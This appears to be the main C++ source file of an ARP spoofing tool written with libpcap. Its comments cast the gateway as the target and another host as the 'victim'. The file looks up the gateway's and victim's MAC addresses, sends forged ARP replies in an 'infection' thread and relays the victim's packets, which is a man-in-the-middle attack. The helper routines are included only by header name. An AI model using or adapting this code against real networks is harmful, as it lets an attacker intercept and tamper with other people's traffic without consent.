#include <iostream>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <thread>
#include "parse_data.h"
#include "parse_data_in_linux.h"
#include "get_target_data.h"
#include "get_sender_data.h"
#include "make_send_reply_packet.h"
#include "relay_normal_packet.h"

using namespace std;

//READ ME
//attacker =  my pc
//target   =  gateway
//sender  =   victim

int main(int argc, char *argv[]){
    parse_data parse(argc,argv);
    parse_data_in_linux(&parse); //get host mac & ip
    get_target_data(&parse);    //get gateway mac
    get_sender_data(&parse);     //get victim mac
    make_send_reply_packet(&parse); //send ARP reply to target
    thread infection(&send_reply_arp,parse.using_send_arp_reply_pcaphandle(),parse.using_send_arp_reply_packet(),parse.using_send_arp_reply_length());
    relay_normal_packet(&parse,parse.using_send_arp_reply_pcaphandle());
    infection.join();
    pcap_close(parse.using_send_arp_reply_pcaphandle());
    return 0;
}
